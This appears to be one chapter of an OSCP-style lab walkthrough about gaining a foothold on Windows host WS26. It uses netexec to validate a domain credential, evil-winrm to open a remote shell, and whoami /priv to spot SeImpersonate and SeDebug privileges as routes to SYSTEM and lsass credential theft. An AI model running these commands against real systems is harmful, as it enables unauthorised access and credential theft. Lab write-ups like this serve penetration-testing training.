# 02 — Foothold on `WS26`

The set hands over one domain credential. It is a normal user — no admin groups, no interesting
group membership — and it is enough, because `172.16.97.206` is running WinRM.

## 2.1 Validate the credential

```bash
nxc smb 172.16.97.206 -u p.andrew -p '[redacted]' -d oscp.exam
nxc winrm 172.16.97.206 -u p.andrew -p '[redacted]' -d oscp.exam
```

```text
SMB         172.16.97.206   445    WS26    [*] Windows Server 2019 Build 17763 x64 (name:WS26) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         172.16.97.206   445    WS26    [+] oscp.exam\p.andrew:[redacted]
WINRM       172.16.97.206   5985   WS26    [*] Windows Server 2019 Build 17763 (name:WS26)
WINRM       172.16.97.206   5985   WS26    [+] oscp.exam\p.andrew:[redacted] (Pwn3d!)
```

`(Pwn3d!)` on WinRM is the whole foothold: the account is a member of `Remote Management Users` on
that host, so the credential is a shell, not just a login. SMB accepts it too, but SMB only proves the
password — WinRM proves the authorisation.

## 2.2 The shell

```bash
evil-winrm -i 172.16.97.206 -u p.andrew -p '[redacted]'
```

```text
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\p.andrew\Documents> whoami
oscp\p.andrew
*Evil-WinRM* PS C:\Users\p.andrew\Documents> hostname
WS26
*Evil-WinRM* PS C:\Users\p.andrew\Documents> net user p.andrew /domain
```

```text
The request will be processed at a domain controller for domain oscp.exam.

User name                    p.andrew
Full Name                    [redacted]
Local Group Membership       *None
Global Group memberships     *Domain Users
The command completed successfully.
```

The account is deliberately ordinary: it authenticates, it opens a shell, and it holds nothing else.
The next question is not "what can this user read" — it is "what does this token carry".

## 2.3 The token

```powershell
whoami /priv
```

```text
Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
SeDebugPrivilege              Debug programs                            Enabled
```

Two lines matter here:

| Privilege | State | What it unlocks |
|---|---|---|
| `SeImpersonatePrivilege` | Enabled | a potato-style token theft → `SYSTEM` on this host |
| `SeDebugPrivilege` | Enabled | open any process, including `lsass.exe` → every credential on the machine |

`SeImpersonatePrivilege` enabled is already a privilege-escalation primitive on its own, and it is the
usual reason a web shell becomes `SYSTEM`. `SeDebugPrivilege` is the shorter path: it does not need a
rogue service or a coerced authentication, only a process that can read another process's memory.

> `whoami /priv` is not a formality. Two lines in that table decide whether the box is a ten-minute
> privesc or a six-hour one.

## 2.4 What the foothold actually gives

- A shell as a domain user on a member server, with `C:\Users\p.andrew` writable — somewhere to drop
  tooling.
- A token with `SeDebugPrivilege`, which is the real door (next chapter).
- A working route to the domain controller for LDAP, SMB and Kerberos — `WS26` can talk to `SRV22`
  even though Kali cannot, which is what makes the tunnel and BloodHound possible later.

The foothold itself is worth nothing. The privilege in the token is worth the machine.

---

**Next:** [`03-privilege-escalation.md`](03-privilege-escalation.md)
